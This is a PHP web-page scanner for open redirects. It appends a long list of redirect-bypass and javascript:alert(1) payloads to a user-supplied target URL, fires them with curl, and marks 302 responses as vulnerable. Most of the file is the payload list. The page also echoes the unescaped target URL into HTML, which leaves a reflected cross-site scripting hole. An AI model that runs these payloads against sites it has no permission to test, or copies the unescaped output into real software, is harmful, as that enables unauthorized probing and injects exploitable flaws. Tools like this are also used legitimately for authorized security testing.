<?php
$judul=@Open_Redirect_Scanner;
include'sec.php';
error_reporting(0);
?>
<div class="container">
  <div class="row">
  <div class="col">
  <div class="card">
    <div class="card-header"><p><?php echo str_replace("_", " ", "$judul"); ?></p></div>
    <div class="card-body">
      <div class="table-responsive">
         
               <form  method="POST">
          <div class="form-group">
           <div class="input-group">
             <input type="url" class="form-control text-danger" placeholder="https://target.com" name="url"/>
                <input type="submit"  class="btn btn-primary" value="Go">
           </div>
          </div>
      </form>       
      <?php
        $array = array('/http://www.helixs.tech', '/%5cexample.com', '/%2f%2fexample.com', '/www.helixs.tech/%2f%2e%2e', '/http:/www.helixs.tech', '/?url=http://www.helixs.tech&next=http://www.helixs.tech&redirect=http://www.helixs.tech&redir=http://www.helixs.tech&rurl=http://www.helixs.tech', '/?url=//www.helixs.tech&next=//www.helixs.tech&redirect=//www.helixs.tech&redir=//www.helixs.tech&rurl=//www.helixs.tech', '/?url=/\/www.helixs.tech&next=/\/www.helixs.tech&redirect=/\/www.helixs.tech', '/redirect?url=http://www.helixs.tech&next=http://www.helixs.tech&redirect=http://www.helixs.tech&redir=http://www.helixs.tech&rurl=http://www.helixs.tech', '/redirect?url=//www.helixs.tech&next=//www.helixs.tech&redirect=//www.helixs.tech&redir=//www.helixs.tech&rurl=//www.helixs.tech', '/redirect?url=/\/www.helixs.tech&next=/\/www.helixs.tech&redirect=/\/www.helixs.tech&redir=/\/www.helixs.tech&rurl=/\/www.helixs.tech', '/.www.helixs.tech', '///\;@www.helixs.tech', '///www.helixs.tech/', '///www.helixs.tech', '///www.helixs.tech/%2f..', '/////www.helixs.tech/', '/////www.helixs.tech', '/%09/www.helixs.tech', '/%2f%2fexample.com', '/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/', '/%5cexample.com', '/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d', '/.www.helixs.tech', '//%09/www.helixs.tech', '//%5cexample.com', '///%09/www.helixs.tech', '///%5cexample.com', '////%09/www.helixs.tech', '////%5cexample.com', '/////www.helixs.tech', '/////www.helixs.tech/', '////\;@www.helixs.tech', '////www.helixs.tech/', '////www.helixs.tech/%2e%2e', '////www.helixs.tech/%2e%2e%2f', '////www.helixs.tech/%2f%2e%2e', '////www.helixs.tech/%2f..', '////www.helixs.tech//', '///\;@www.helixs.tech', '///www.helixs.tech', '///www.helixs.tech/', '///www.helixs.tech/%2e%2e', '///www.helixs.tech/%2e%2e%2f', '///www.helixs.tech/%2f%2e%2e', '///www.helixs.tech/%2f..', '///www.helixs.tech//', '//www.helixs.tech', '//www.helixs.tech/', '//www.helixs.tech/%2e%2e', '//www.helixs.tech/%2e%2e%2f', '//www.helixs.tech/%2f%2e%2e', '//www.helixs.tech/%2f..', '//www.helixs.tech//', '//google%E3%80%82com', '//https:///www.helixs.tech/%2e%2e', '//https://www.helixs.tech/%2e%2e%2f', '//https://www.helixs.tech//', '///www.helixs.tech', '/\/\/www.helixs.tech/', '/\/www.helixs.tech/', '/www.helixs.tech/%2f%2e%2e', '/http://%67%6f%6f%67%6c%65%2e%63%6f%6d', '/http://www.helixs.tech', '/http:/www.helixs.tech', '/https:/%5cexample.com/', '/https://%09/www.helixs.tech', '/https://%5cexample.com', '/https:///www.helixs.tech/%2e%2e', '/https:///www.helixs.tech/%2f%2e%2e', '/https://www.helixs.tech', '/https://www.helixs.tech/', '/https://www.helixs.tech/%2e%2e', '/https://www.helixs.tech/%2e%2e%2f', '/https://www.helixs.tech/%2f%2e%2e', '/https://www.helixs.tech/%2f..', '/https://www.helixs.tech//', '/https:www.helixs.tech', '/redirect?url=//www.helixs.tech&next=//www.helixs.tech&redirect=//www.helixs.tech&redir=//www.helixs.tech&rurl=//www.helixs.tech&redirect_uri=//www.helixs.tech', '/redirect?url=/\/www.helixs.tech&next=/\/www.helixs.tech&redirect=/\/www.helixs.tech&redir=/\/www.helixs.tech&rurl=/\/www.helixs.tech&redirect_uri=/\/www.helixs.tech', '/redirect?url=Https://www.helixs.tech&next=Https://www.helixs.tech&redirect=Https://www.helixs.tech&redir=Https://www.helixs.tech&rurl=Https://www.helixs.tech&redirect_uri=Https://www.helixs.tech', '//javascript:alert(1)', '/javascript:alert(1)', '/%5cjavascript:alert(1);', '/%5cjavascript:alert(1)', '//google.com', '//google%E3%80%82com', '/http://%67%6f%6f%67%6c%65%2e%63%6f%6d', '//google.com', '\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)', '\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)', 'ja\nva\tscript\r:alert(1)', '\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)', '\152\141\166\141\163\143\162\151\160\164\072alert(1)', '///%09/google.com', '////%09/google.com', '/https://%09/google.com', '/%5cgoogle.com', '//%5cgoogle.com', '///%5cgoogle.com', '////%5cgoogle.com', '/https://%5cgoogle.com', '/https:///%5cgoogle.com', '/https://%5cgoogle.com', '/https://google.com', '/http:///////////google.com', '\\google.com', '///%09/www.helixs.tech', '///%5cexample.com', '////%09/www.helixs.tech', '////%5cexample.com', '/////www.helixs.tech', '/////www.helixs.tech/', '////\;@www.helixs.tech', '////www.helixs.tech/', '////www.helixs.tech/%2e%2e', '////www.helixs.tech/%2e%2e%2f', '////www.helixs.tech/%2f%2e%2e', '////www.helixs.tech/%2f..', '////www.helixs.tech//', '///\;@www.helixs.tech', '///www.helixs.tech', '///www.helixs.tech/', '///www.helixs.tech/%2e%2e', '///www.helixs.tech/%2e%2e%2f', '///www.helixs.tech/%2f%2e%2e', 'ja\nva\tscript\r:alert(1)', '\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)', '//google%E3%80%82com', '/%09/javascript:alert(1);', '/%09/javascript:alert(1)', '/%5cjavascript:alert(1);', '/%5cjavascript:alert(1)', '\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)', '//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw', 'google%252ecom', '//google.com', '///google.com', '//;@google.com', '///;@google.com', '/////google.com/', '/////google.com', '////\;@google.com', '////google.com//', '////google.com/', '////google.com', '///\;@google.com', '///google.com//', '///google.com/', '///google.com', '//\/google.com/', '//\google.com', '//google.com//', '//google.com/', '//google.com', '/.google.com', '/\/\/google.com/', '/\/google.com/', '/\/google.com', '/\google.com', '/google.com', '../google.com', '.google.com', '@google.com', '\/\/google.com/', '////google.com/%2e%2e', '///google.com/%2e%2e', '//google.com/%2e%2e', '/google.com/%2e%2e', '//google.com/%2E%2E', '////google.com/%2e%2e%2f', '///google.com/%2e%2e%2f', '//google.com/%2e%2e%2f', '////google.com/%2f..', '///google.com/%2f..', '//google.com/%2f..', '//google.com/%2F..', '/google.com/%2F..', '////google.com/%2f%2e%2e', '///google.com/%2f%2e%2e', '//google.com/%2f%2e%2e', '/google.com/%2f%2e%2e', '//google.com//%2F%2E%2E', '/http://google.com', '/http:/google.com', '/http://;@google.com', '/http://.google.com', '/http:/\/\google.com', '/http:/google.com', '/http:google.com', '//https://google.com//', '/https://google.com//', '/https://google.com/', '/https://google.com', '/https:google.com', '/https://////google.com', '/https://google.com//', '/https://google.com/', '/https://google.com', '/https:/\google.com', '//https:///google.com/%2e%2e', '/https://google.com/%2e%2e', '/https:///google.com/%2e%2e', '//https://google.com/%2e%2e%2f', '/https://google.com/%2e%2e%2f', '/https://google.com/%2f..', 'https://google.com/%2f..', '/https:///google.com/%2f%2e%2e', '/https://google.com/%2f%2e%2e', '/https:///google.com/%2f%2e%2e', '/https://google.com/%2f%2e%2e','go/https://www.helixs.tech/','helix','Helix','Vuln');
    foreach($array as $Payload)
    {
        if(!empty($_REQUEST["url"])){
           $url1 = $_REQUEST["url"];
         $url = $url1.'/'.$Payload;
        }
        
        $methode = "post";
        if(!empty($_REQUEST["methode"])){
           $methode = $_REQUEST["methode"];
        }
      ?>

      
      <?php  if($url){ ?>
          <?php
            $time_start = microtime(TRUE);

            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, true);
            
            if($methode == "post"){
                curl_setopt($ch, CURLOPT_POST, true);
            } elseif ($methode == "put"){
                curl_setopt($ch, CURLOPT_PUT, true);
            }

            $response = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            $time_end = microtime(TRUE);
            $time_diff = ($time_end - $time_start);
            
            list($header, $body) = explode("\r\n\r\n", $response, 2);
         ?>
              <?php
if($httpcode == "302"){
                echo '<br><div class="alert alert-success"><b class="text-success">vuln <a href='.$url.' target="_blank"> '.$url.'</a></b></div>';
}
              ?>
              <? }} ?>